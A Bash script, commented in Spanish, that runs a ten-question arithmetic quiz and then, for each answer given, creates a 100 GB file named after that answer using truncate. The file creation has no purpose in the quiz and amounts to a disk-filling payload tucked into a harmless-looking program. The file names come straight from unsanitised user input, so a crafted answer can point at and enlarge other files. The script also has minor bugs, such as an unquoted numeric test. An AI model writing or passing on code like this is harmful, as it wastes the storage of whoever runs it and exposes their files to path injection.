#!/bin/bash

respuestas=()
respuestas_correctas=0

for ((i=1; i<=10; i++))
do
  numero1=$((RANDOM % 1000000))
  numero2=$((RANDOM % 1000000))
  operacion=$((RANDOM % 2))

  if [ $operacion -eq 0 ]; then
    resultado=$((numero1 + numero2))
    echo "Pregunta $i: ¿Cuál es la suma de $numero1 y $numero2?"
  else
    resultado=$((numero1 - numero2))
    echo "Pregunta $i: ¿Cuál es la resta de $numero1 menos $numero2?"
  fi

  read respuesta
  respuestas+=("$respuesta")

  if [ $respuesta -eq $resultado ]; then
    respuestas_correctas=$((respuestas_correctas + 1))
  fi
done

puntuacion=$((respuestas_correctas * 10))

for ((i=0; i<10; i++))
do
  resultado="${respuestas[$i]}"

  # Crear un archivo con el resultado de 100 GB
  archivo="acala_$resultado.txt"
  truncate -s 100G "$archivo"
done

echo "Has obtenido $respuestas_correctas respuestas correctas de 10."
echo "Tu puntuación es de $puntuacion/100."
